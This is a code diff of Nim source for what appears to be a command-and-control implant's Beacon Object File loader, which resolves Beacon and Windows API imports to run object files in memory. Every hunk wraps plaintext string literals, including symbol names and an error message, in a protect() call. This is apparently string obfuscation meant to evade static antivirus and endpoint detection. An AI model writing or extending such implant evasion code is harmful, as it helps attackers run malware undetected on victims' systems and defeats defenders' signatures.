@@ -79,7 +79,7 @@ proc objectVirtualSize(objCtx: POBJECT_CTX): ULONG =
 
             # Check if symbol starts with `__imp_` (imported functions)
             let symStr = $symbol
-            if symStr.len >= 6 and symStr[0..5] == "__imp_":
+            if symStr.len >= 6 and symStr[0..5] == protect("__imp_"):
                 length += ULONG(sizeof(PVOID))
 
             # Handle next relocation item/symbol
@@ -126,12 +126,12 @@ proc objectResolveSymbol(symbol: var PSTR, stringTable: PCHAR): PVOID =
     let fullSymbol = $symbol
 
     # Check for internal Beacon functions
-    if (fullSymbol.len >= 12 and fullSymbol[0..11] == "__imp_Beacon") or
-       (fullSymbol.len >= 16 and fullSymbol[0..15] == "__imp_toWideChar") or
-       (fullSymbol.len >= 18 and fullSymbol[0..17] == "__imp_LoadLibraryA") or
-       (fullSymbol.len >= 20 and fullSymbol[0..19] == "__imp_GetProcAddress") or
-       (fullSymbol.len >= 22 and fullSymbol[0..21] == "__imp_GetModuleHandleA") or
-       (fullSymbol.len >= 17 and fullSymbol[0..16] == "__imp_FreeLibrary"):
+    if (fullSymbol.len >= 12 and fullSymbol[0..11] == protect("__imp_Beacon")) or
+       (fullSymbol.len >= 16 and fullSymbol[0..15] == protect("__imp_toWideChar")) or
+       (fullSymbol.len >= 18 and fullSymbol[0..17] == protect("__imp_LoadLibraryA")) or
+       (fullSymbol.len >= 20 and fullSymbol[0..19] == protect("__imp_GetProcAddress")) or
+       (fullSymbol.len >= 22 and fullSymbol[0..21] == protect("__imp_GetModuleHandleA")) or
+       (fullSymbol.len >= 17 and fullSymbol[0..16] == protect("__imp_FreeLibrary")):
 
         let funcName = fullSymbol[6..^1]
 
@@ -343,7 +343,7 @@ proc inlineExecute*(objectFile: PBYTE, objectFileLen: DWORD, args: PBYTE = nil, 
             raise newException(CatchableError, protect("Only x64 object files are supported."))
     else:
         RtlSecureZeroMemory(addr objCtx, sizeof(objCtx))
-        raise newException(CatchableError, "Only x64 object files are supported.")
+        raise newException(CatchableError, protect("Only x64 object files are supported."))
 
     # Calculate required virtual memory
     virtSize = objectVirtualSize(addr objCtx)
